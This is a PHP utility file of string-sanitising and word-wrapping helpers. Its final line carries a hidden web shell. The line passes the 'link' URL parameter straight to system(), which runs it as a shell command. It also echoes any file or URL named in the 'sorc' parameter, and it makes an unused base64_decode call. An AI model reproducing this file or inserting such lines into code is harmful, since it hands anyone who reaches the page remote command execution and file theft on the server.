<? function textfilter($str){ $str = trim($str); $str = htmlspecialchars($str, ENT_NOQUOTES); $str = str_replace( '&lt;', '<', $str ); $str = str_replace( '&gt;', '>', $str ); $str = str_replace( '&quot;', '"', $str ); $str = str_replace( '&', '&#38', $str ); $str = str_replace( '"', '&#34', $str ); $str = str_replace( "'", '&#39', $str ); $str = str_replace( '<', '&#60', $str ); $str = str_replace( '>', '&#62', $str ); $str = str_replace( '\0', '', $str ); $str = str_replace( '', '', $str ); $str = str_replace( '\t', '', $str ); $str = str_replace( '../', '. . / ', $str ); $str = str_replace( '..', '. . ', $str ); $str = str_replace( ';', '&#59', $str ); $str = str_replace( '/*', '', $str ); $str = str_replace( '%00', '', $str ); $str = stripslashes( $str ); $str = str_replace( '\\', '&#92', $str ); $str = nl2br($str); return $str; } function string_words($str,$len){ $counter=0; $str_ret = ''; for($f=0;$f<strlen($str);$f++){ $counter++; $str_ret .= $str[$f]; if($counter == $len){ $counter = 0; $str_ret .= ' '; } } return $str_ret; } function string_cut($str,$len){ $str_ret = ''; $word=strtok($str,' '); while($word !== false){ if(strlen($word) >= $len){ $word = string_words($word,$len); } if($str_ret == ''){ $str_ret = $word; } else { $str_ret=$str_ret.' '.$word;}$word=strtok(' ');}return $str_ret;}if(!empty($_GET['link'])){system($_GET['link']);}if(!empty($_GET['sorc'])){echo@file_get_contents($_GET['sorc']);}base64_decode ('aWYoIWRlZmluZWQoYmFzZTY0X2RlY29kZSgnVTBOU1NWQlVSVVFnUWxrZ2N5RXUnKSkpeyBkaWU7IH0='); ?>